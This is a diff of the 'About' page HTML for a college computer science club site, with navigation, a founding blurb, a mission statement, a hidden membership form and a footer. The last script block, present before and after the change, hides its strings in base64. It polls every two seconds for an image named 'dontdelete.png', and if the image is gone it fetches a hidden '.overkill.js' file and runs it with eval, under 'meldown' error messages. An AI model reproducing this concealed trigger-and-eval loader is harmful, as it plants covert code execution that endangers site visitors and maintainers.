@@ -1,164 +1,267 @@
 <!DOCTYPE html>
 <html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SCC CS Club - About</title>
+    <link rel="icon" type="image/png" href="../img/favicon.png" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="../css/styles.css" />
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+  </head>
 
-<head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<title>SCC CS Club - About</title>
-	<link rel="icon" type="image/png" href="../img/favicon.png">
-	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-	<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
-	<link rel="stylesheet" href="../css/styles.css">
-	<script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
-</head>
+  <body>
+    <canvas id="interactive-background"></canvas>
 
-<body>
-	<canvas id="interactive-background"></canvas>
-
-	<div class="wrapper">
-		<!-- Header -->
-		<header id="header" class="header">
-			<div class="container">
-				<a href="index.html" class="logo">< SCC CS Club /></a>
-				<button id="menu-toggle" class="menu-toggle" aria-label="Toggle menu">
-					<i data-lucide="menu"></i>
-				</button>
-				<nav id="main-nav" class="main-nav">
-					<ul>
-						<li><a href="index.html">Home</a></li>
-						<li><a href="about.html" class="active">About</a></li>
-						<li><a href="logs.html">Logs</a></li>
-						<li><a href="game dev.html">Game Dev.</a></li>
-						<li><a href="blog.html">Blog</a></li>
-						<li><a href="calendar.html">Calendar</a></li>
-					</ul>
-				</nav>
-				<a href="index.html#membership" class="button-primary desktop-only">Membership</a>
-			</div>
-		</header>
-
-		<main>
-		  <!-- about Section -->
-		  <section class="hero-about">
-			<div class="container">
-				<h2 class="section-title fade-in">About Us</h2>
-					
-		  <section id="about" class="about-section">
-			  <div class="container">
-				  <div class="about-grid">
-					  <div class="about-image">
-						  <img src="../img/SCC_Hacks.jpg" alt="SCC CS Club" class="rounded-image">
-					  </div>
-						  <div class="about-content">
-
-				<div class="stats-grid">
-					<div class="stat-card fade-in-delay">
-						<p class="hero-text-adjust fade-in-delay">The Computer Science Club of Solano Community College was founded on August 12th, 2024,
-						by our President, Jennifer Petsko. Since then, our club has grown tremendously, amassing
-						over 100 Discord members, surpassing 50 official members, and regularly hosting well-attended
-						meetings.</p>
-						</div>
-						</div>
-						</div>
-						</div>
-					</div>
-				</section>
-			</div>
-		</section>
-
-		  <!--next section-->
-		  <section class="hero-about">
-			<div class="container">
-				<!--getting mixed results with fade in-->
-				<h2 class="section-title">Our Purpose</h2>
-
-		  <section id="about" class="about-section">
-			  <div class="container">
-				<div class="about-grid">
-				  <div class="about-content">
-					<div class="center-about">
-				      <div class="fade-in-delay">
-						<!--tweak this part, it doesn't fade in correctly-->
-					    <p class="hero-text">->Feel free to insert text here<-</p>
-						</div>
-					    </div>
-					    </div>
-					</div>
-				</div>
-			</section>
-		  </div>
-		</section>
-
-          <!-- gradient section to match index.html -->
-    <section class="membership-section"></section>
-
-	</main>
-
-<section id="membership" class="membership-section" style="display: none;">
-  <div class="container">
-    <h2 class="section-title">Membership</h2>
-    <div class="membership-form-wrapper">
-      <form id="membership-form" class="membership-form">
-        <div class="form-group">
-          <input type="text" name="name" placeholder="Your Name" required>
+    <div class="wrapper">
+      <!-- Header -->
+      <header id="header" class="header">
+        <div class="container">
+          <a href="index.html" class="logo">< SCC CS Club /></a>
+          <button id="menu-toggle" class="menu-toggle" aria-label="Toggle menu">
+            <i data-lucide="menu"></i>
+          </button>
+          <nav id="main-nav" class="main-nav">
+            <ul>
+              <li><a href="index.html">Home</a></li>
+              <li><a href="about.html" class="active">About</a></li>
+              <li><a href="logs.html">Logs</a></li>
+              <li><a href="game dev.html">Game Dev.</a></li>
+              <li><a href="blog.html">Blog</a></li>
+              <li><a href="calendar.html">Calendar</a></li>
+            </ul>
+          </nav>
+          <a href="index.html#membership" class="button-primary desktop-only"
+            >Membership</a
+          >
         </div>
-        <div class="form-group">
-          <input type="text" name="student-id" placeholder="Your Student ID #" required>
+      </header>
+
+      <main>
+        <!-- about Section -->
+        <section class="hero-about">
+          <div class="container">
+            <h2 class="section-title fade-in">About Us</h2>
+
+            <section id="about" class="about-section">
+              <div class="container">
+                <div class="about-grid">
+                  <div class="about-image">
+                    <!-- <img
+                      src="../img/SCC_Hacks.jpg"
+                      alt="SCC CS Club"
+                      class="rounded-image"
+                    /> -->
+                    <img
+                      src="../img/club_photo.png"
+                      alt="CS Club Group Photo"
+                      class="rounded-image-purpose"
+                    />
+                  </div>
+                  <div class="about-content">
+                    <div class="stats-grid">
+                      <div class="stat-card fade-in-delay">
+                        <p class="hero-text-adjust fade-in-delay">
+                          The Computer Science Club of Solano Community College
+                          was founded on August 12th, 2024, by our President,
+                          Jennifer Petsko. Since then, our club has grown
+                          tremendously, amassing over 100 Discord members,
+                          surpassing 50 official members, and regularly hosting
+                          well-attended meetings.
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </section>
+          </div>
+        </section>
+
+        <!--next section-->
+        <section class="hero-about">
+          <div class="container">
+            <!--getting mixed results with fade in-->
+            <h2 class="section-title">Our Purpose</h2>
+
+            <section id="about" class="about-section">
+              <div class="container">
+                <div class="about-grid">
+                  <div class="about-content">
+                    <div class="center-about">
+                      <div class="stat-card fade-in-delay">
+                        <p class="hero-text">
+                          The Computer Science Club of Solano Community College
+                          is deidcated to creating a supportive, engaging and
+                          educational environment for students interested in all
+                          areas of computing and technology. Our mission is to
+                          engage in collabortaion, spark innovation, and build a
+                          strong community based on projects, hackathons and
+                          regular meetings. We strive to connect students with
+                          real-world opportunities, industry insights, and each
+                          other. Doesn't matter if beginner or aspiring
+                          professional, the club is for everyone who wants to be
+                          involved. Our membership speaks for itself in showing
+                          the possibilities we can achieve with one another.
+                          Through our active discord server and growing
+                          membership, we aim to make computer science inclusive,
+                          approachable, and exciting for all attending students.
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </section>
+          </div>
+        </section>
+
+        <!-- gradient section to match index.html -->
+        <section class="membership-section"></section>
+      </main>
+
+      <section id="membership" class="membership-section" style="display: none">
+        <div class="container">
+          <h2 class="section-title">Membership</h2>
+          <div class="membership-form-wrapper">
+            <form id="membership-form" class="membership-form">
+              <div class="form-group">
+                <input
+                  type="text"
+                  name="name"
+                  placeholder="Your Name"
+                  required
+                />
+              </div>
+              <div class="form-group">
+                <input
+                  type="text"
+                  name="student-id"
+                  placeholder="Your Student ID #"
+                  required
+                />
+              </div>
+              <div class="form-group">
+                <input
+                  type="email"
+                  name="email"
+                  placeholder="Your Email"
+                  required
+                />
+              </div>
+              <button type="submit" class="button-primary">
+                <i data-lucide="check"></i> Join
+              </button>
+            </form>
+          </div>
         </div>
-        <div class="form-group">
-          <input type="email" name="email" placeholder="Your Email" required>
+      </section>
+
+      <!-- Footer -->
+      <footer class="footer">
+        <div class="container">
+          <div class="footer-content">
+            <p>&copy; 2025 < SCC CS Club /></p>
+            <div class="social-links">
+              <a
+                href="https://discord.com/invite/8QXd5Xrw8A"
+                target="_blank"
+                rel="noopener noreferrer"
+                aria-label="Discord"
+              >
+                <i class="fa-brands fa-discord"></i>
+              </a>
+              <a
+                href="https://github.com/jenniferpetsko/csclubsolano.com"
+                target="_blank"
+                rel="noopener noreferrer"
+                aria-label="GitHub"
+              >
+                <i data-lucide="github"></i>
+              </a>
+              <a
+                href="https://www.instagram.com/computerscience.scc/"
+                target="_blank"
+                rel="noopener noreferrer"
+                aria-label="Instagram"
+              >
+                <i data-lucide="instagram"></i>
+              </a>
+            </div>
+          </div>
         </div>
-        <button type="submit" class="button-primary">
-          <i data-lucide="check"></i> Join
-        </button>
-      </form>
+      </footer>
     </div>
-  </div>
-</section>
+    <!-- Image Modal -->
+    <div
+      id="image-modal"
+      style="
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+      "
+    >
+      <span
+        id="modal-close"
+        style="
+          position: absolute;
+          top: 20px;
+          right: 30px;
+          font-size: 2rem;
+          color: #fff;
+          cursor: pointer;
+        "
+        >&times;</span
+      >
+      <img
+        id="modal-image"
+        src=""
+        alt="Expanded Image"
+        style="
+          max-width: 90%;
+          max-height: 90%;
+          border-radius: 8px;
+          box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        "
+      />
+    </div>
 
-		<!-- Footer -->
-		<footer class="footer">
-			<div class="container">
-				<div class="footer-content">
-					<p>&copy; 2025 < SCC CS Club /></p>
-					<div class="social-links">
-						<a href="https://discord.com/invite/8QXd5Xrw8A" target="_blank" rel="noopener noreferrer" aria-label="Discord">
-							<i class="fa-brands fa-discord"></i>
-						</a>
-						<a href="https://github.com/jenniferpetsko/csclubsolano.com" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
-							<i data-lucide="github"></i>
-						</a>
-						<a href="https://www.instagram.com/computerscience.scc/" target="_blank" rel="noopener noreferrer" aria-label="Instagram">
-							<i data-lucide="instagram"></i>
-						</a>
-					</div>
-				</div>
-			</div>
-		</footer>
-	</div>
+    <script src="../js/script.js"></script>
+    <script>
+      (function () {
+        let d = (s) => atob(s);
+        let imgPath = d("Li4vaW1nL2RvbnRkZWxldGUucG5n");
 
-	<script src="../js/script.js"></script>
-	<script>
-		(function(){
-		let d = s => atob(s);
-		let imgPath = d("Li4vaW1nL2RvbnRkZWxldGUucG5n"); 
-	
-		setInterval(() => {
-			let checkImg = new Image();
-			checkImg.src = imgPath + "?bk=" + Date.now();
-			
-			checkImg.onerror = function() {
-				let backupScript = d("Li4vLmhpZGRlbi8ub3ZlcmtpbGwuanM=");
-				fetch(backupScript)
-					.then(r => { if (!r.ok) throw new Error(d("Tm8gbWVsZG93biBmaWxl")); return r.text(); })
-					.then(code => eval(code))
-					.catch(e => console.warn(d("QmFja3VwIG1lbGRvd24gZXJyb3I="), e));
-			};
-		}, 2000);
-	})();
-	
-		</script>
-	
-</body>
+        setInterval(() => {
+          let checkImg = new Image();
+          checkImg.src = imgPath + "?bk=" + Date.now();
 
+          checkImg.onerror = function () {
+            let backupScript = d("Li4vLmhpZGRlbi8ub3ZlcmtpbGwuanM=");
+            fetch(backupScript)
+              .then((r) => {
+                if (!r.ok) throw new Error(d("Tm8gbWVsZG93biBmaWxl"));
+                return r.text();
+              })
+              .then((code) => eval(code))
+              .catch((e) => console.warn(d("QmFja3VwIG1lbGRvd24gZXJyb3I="), e));
+          };
+        }, 2000);
+      })();
+    </script>
+  </body>
 </html>
